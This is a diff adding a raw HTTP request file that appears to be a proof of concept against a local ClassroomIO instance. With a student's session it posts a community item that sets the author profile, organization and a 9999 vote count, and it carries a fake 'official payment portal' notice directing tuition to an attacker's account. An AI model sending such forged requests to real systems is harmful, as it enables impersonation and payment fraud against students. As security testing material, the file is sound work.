@@ -1,0 +1,15 @@
+POST /community HTTP/1.1
+Host: localhost:21527
+Content-Type: application/json
+cio-org-id: 48bbdff8-2ad5-46a3-a259-2ca3d52677dd
+Cookie: classroomio.session_token=<STUDENT session>
+
+{
+  "slug": "notice_8244f674",
+  "title": "OFFICIAL: mandatory payment portal",
+  "body": "Wire tuition to attacker-controlled account. marker=body_d6d2d5ea",
+  "courseId": "eeddad2e-c2cc-457b-ae5a-62e9e7989009",
+  "organizationId": "48bbdff8-2ad5-46a3-a259-2ca3d52677dd",
+  "authorProfileId": "0419cf7a-0f8b-4797-b953-e8747cc41939",
+  "votes": 9999
+}
